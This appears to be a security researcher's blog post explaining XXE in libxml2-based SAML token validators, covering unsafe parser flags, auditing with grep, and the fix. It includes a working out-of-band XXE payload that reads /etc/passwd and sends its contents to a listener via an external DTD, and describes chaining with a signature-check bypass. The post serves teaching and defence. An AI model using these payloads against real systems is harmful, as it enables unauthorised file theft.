---
title: "XXE in SAML validators: reading files before a signature is ever checked"
date: 2026-08-14T10:30:00+05:00
tags: ["xxe", "saml", "methodology"]
slug: "saml-parser-xxe"
translationKey: saml-parser-xxe
draft: false
summary: "Why SAML token validators are a soft spot for XXE, how the libxml2 defaults betray them, and how I look for it — from first principles."
---

SAML is XML, and XML parsers will read files off the disk for you unless you specifically
tell them not to. Those two facts, sitting next to each other, are the whole bug. The code
that validates a SAML token is one of the most reliable places to find XXE, and this post
is about why — starting from the beginning, so it makes sense even if you've never fired an
XXE payload.

This is a class writeup, not a specific bug. No product, no vendor. If you audit anything
that speaks SAML — an SSO login flow, a token validation service, an agent that
authenticates over a socket — this is the shape to look for.

## First, what XXE actually is

XML lets you define shortcuts called **entities**. You've seen the built-in ones: `&lt;`
becomes `<`, `&amp;` becomes `&`. You can also declare your own:

```xml
<!DOCTYPE foo [
  <!ENTITY greeting "hello">
]>
<foo>&greeting;</foo>
```

When the parser reads this, `&greeting;` gets replaced with `hello`. So far, harmless — it's
just find-and-replace inside the document.

The dangerous part is that an entity's value doesn't have to be text you wrote inline. It can
point at something **external** — a file, a URL:

```xml
<!DOCTYPE foo [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<foo>&secret;</foo>
```

Now `&secret;` means *"go open `/etc/passwd` and paste its contents here."* If the parser is
configured to resolve external entities, it will do exactly that — read the file and drop the
contents into the document. That is **XXE**: XML eXternal Entity injection. The attacker's
XML tells the parser to fetch things it was never supposed to touch — local files, or URLs on
the internal network (which is how XXE turns into SSRF).

The rules for which entities the parser resolves come from the **DTD** (Document Type
Definition) — the block inside `<!DOCTYPE ... [ ... ]>`. The DTD can live inside the document,
or the document can say *"load my DTD from over there"* and point at a URL. Both of those are
levers we'll pull.

The one-line summary: **if a parser expands entities and is willing to reach out to files and
URLs, anyone who controls the XML can make it read things.** SAML tokens are attacker-supplied
XML. You see where this goes.

## Why the validator, specifically

Here's the part that trips people up. "The SAML token is signed," they say, "so an attacker
can't forge one." True — but irrelevant, and here's why.

To check a signature, you first have to have the document in memory. So the validator always
does this, in this order:

1. **Parse** the XML into a tree in memory
2. Validate the schema
3. Check the subject, the conditions, the timestamps
4. **Verify the signature**

The signature check is step four. Entity expansion — the file read — happens in step one,
during the parse. By the time the code reaches step four and says *"this signature is
garbage, reject it,"* the file has already been read and, as you'll see, already sent to you.

So we're not forging a valid token. We're sending a **deliberately invalid** one whose only
job is to carry the malicious entities. The token gets rejected at step four every single
time — and we don't care, because the payload fired at step one.

```goat
  attacker token   .-------------.  entity expands    .------------.
  (bad signature)->|  parse XML  |----- file read --->|  /etc/...  |
                   '------+------'   HTTP exfil        '------------'
                          |
                          v          the read already happened up there;
                   .-------------.   this rejection is too late to matter
                   |  validate   |
                   '-------------'
```

## The libxml2 trap

Most C and C++ code that handles SAML sits on top of **libxml2**, and libxml2 does whatever
flags you pass it. This is where the bug usually lives. A parse call that looks careful:

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT   |   // substitute entities
                    XML_PARSE_DTDATTR |   // process DTD attributes
                    XML_PARSE_DTDLOAD);   // load external DTDs
```

Read those three flags as plain English:

- `XML_PARSE_NOENT` — *"expand entities"* (yes, the name is backwards; it means substitute
  them, not skip them)
- `XML_PARSE_DTDLOAD` — *"if the document points at an external DTD, go fetch it"*
- The missing one: `XML_PARSE_NONET` — *"never use the network."*

That last flag is the seatbelt, and it isn't buckled. With `DTDLOAD` on and `NONET` off, the
parser will happily make network requests while parsing. Combined with entity expansion,
that's a fully loaded XXE.

Two library-wide switches do the same thing at a lower level, and code that never sets them
inherits the unsafe default from older libxml2 versions:

```c
xmlSubstituteEntitiesDefault(1);   // 1 = expand entities
xmlLoadExtDtdDefaultValue = 1;     // 1 = load external DTDs
```

One pattern I keep running into: the safe version of the code **exists**, but it's wrapped in
an `#ifdef` that the build never defines. Someone wrote the fix, parked it behind a compile
flag "to enable later," and the vulnerable `#else` branch is the one that actually ships.
Reading the source tells you the fix is there; it doesn't tell you it's turned on. You have to
check which branch compiled.

## Turning it into a file read, step by step

Let's build the payload slowly. The token we send carries a DTD that points at a server **we**
control:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:9090/x.dtd">
  %dtd;
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
  <saml:Issuer>anything</saml:Issuer>
</saml:Assertion>
```

Two things to notice:

- `%dtd;` uses a `%`, not a `&`. That's a **parameter entity** — an entity used inside the DTD
  itself, rather than in the document body. We need it because the trick below only works with
  parameter entities.
- The `saml:Assertion` at the bottom is just enough shape to look like a token. It doesn't
  need a valid signature. It doesn't need to be a real assertion. It only needs to reach the
  parser.

When the validator parses this, it hits `%dtd;` and fetches `http://127.0.0.1:9090/x.dtd` from
our server. Here's what we serve back:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://127.0.0.1:9090/?d=%file;'>">
%wrap;
%exfil;
```

Walk through what the parser does with it:

1. `%file` — opens `/etc/passwd`, holds its contents.
2. `%wrap` — builds a **new** entity, `exfil`, whose value is a URL with the file contents
   glued into the query string.
3. `%exfil;` — resolves that entity, which makes the parser request
   `http://127.0.0.1:9090/?d=<contents of /etc/passwd>`.

Our server, which is also the listener, receives a request whose query string **is the file**.
That's the read, exfiltrated.

Why the two-server dance instead of just `file:///etc/passwd` directly? Because a validator
almost never shows you the parsed document — it rejects the token and returns an error. So the
file contents can't come back to us *through the response*. Instead we make the parser mail
them to us over a side channel: its own outbound HTTP request. That's the **out-of-band (OOB)**
pattern, and the nested-parameter-entity DTD above is the standard way to do it.

Two gotchas that decide whether it fires:

- **If** the app ever reflects the parsed value back to you, skip all of this — a plain
  `file:///` entity in the token is enough, and you read the file straight from the response.
  OOB is the fallback for the common case where nothing comes back.
- **Some file contents break the payload.** A `%`, an `&`, or a raw newline inside the file can
  corrupt the entity wrapping. `/etc/passwd` and `/etc/hostname` are fine. For messier files,
  if the stack supports it, you wrap the read in a base64 filter so the bytes survive transit.

## When there's a signature in the way

Sometimes the validator refuses to parse an unsigned token at all — it checks *something*
before parsing and bails. That kills the OOB read before it starts. This is where a **second,
independent weakness** can revive it: an auth path that lets you skip the signature check.

I've run into this as a *"trusted caller"* flag — a field in the request that essentially says
*"this token was already verified further upstream, don't bother checking it again"* — which
the service accepts from callers who are, in reality, not trusted at all. On its own that's an
authentication bypass. Chained with the XXE, it clears the last gate: now the parser runs your
input with nothing in front of it.

The takeaway isn't the specific flag. It's that XXE in a validator is worth chasing **even
when** there's a signature check standing in the way — because signature checks are exactly
the kind of code that ends up with a `// TODO: actually verify this` and ships anyway.

## How I look for it

**Source available.** Grep for the parse calls and the switches:

```bash
# where XML gets parsed
grep -rn "xmlReadMemory\|xmlParseMemory\|xmlReadDoc\|xmlCtxtReadMemory" .
# the library-wide switches
grep -rn "xmlSubstituteEntitiesDefault\|xmlLoadExtDtdDefaultValue" .
# a safe path that might be hidden behind a build flag
grep -rn "XML_PARSE_NONET" .        # then confirm it actually compiles
```

If a parse loads DTDs but has no `XML_PARSE_NONET` — or has it only inside an `#ifdef` the
build never sets — you have a candidate. Confirm which branch shipped before you get excited.

**Black box.** Send a token whose DTD points at a host you control, and watch that host for a
callback. An OOB listener — your own HTTP server, or a Collaborator-style service — is the only
reliable oracle here, because the validator will almost always reject the token and tell you
nothing in the response. **The rejection is expected. The callback is the finding.** If the
request never arrives, entity resolution is probably off, and you move on.

## Confirming without overreaching

Point the exfil at a file you're allowed to read — on a box you own, `/etc/hostname` or a file
you dropped yourself — not at secrets, and never at infrastructure you don't have permission to
test. The callback alone proves the entity resolved and the read happened. You do **not** need
to pull `/etc/shadow` to demonstrate the vulnerability, and on someone else's system you
shouldn't. Prove the mechanism, stop, write it up. A screenshot of your listener receiving a
file you were allowed to read is a complete proof.

## The fix

For the parser: add `XML_PARSE_NONET`, and don't hide the safe path behind a build flag —
compile it unconditionally.

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT | XML_PARSE_DTDATTR | XML_PARSE_DTDLOAD
                    | XML_PARSE_NONET);
```

Better still: a SAML validator has no business loading external DTDs in the first place. Turn
entity expansion off entirely (`xmlSubstituteEntitiesDefault(0)`,
`xmlLoadExtDtdDefaultValue = 0`) and parse with the network disabled. Defence in depth, and you
lose nothing — real SAML tokens don't need external DTDs. And any "skip the signature" path
should be gated on the caller genuinely being privileged, not on a flag the caller sets for
itself.

## Takeaway

When you see SAML, ask one question: **what parses this, and with which flags?** The signature
is a distraction — the interesting code runs before it. Find the parse call, check for
`XML_PARSE_NONET`, and if it's missing, you're one out-of-band callback away from knowing for
sure.
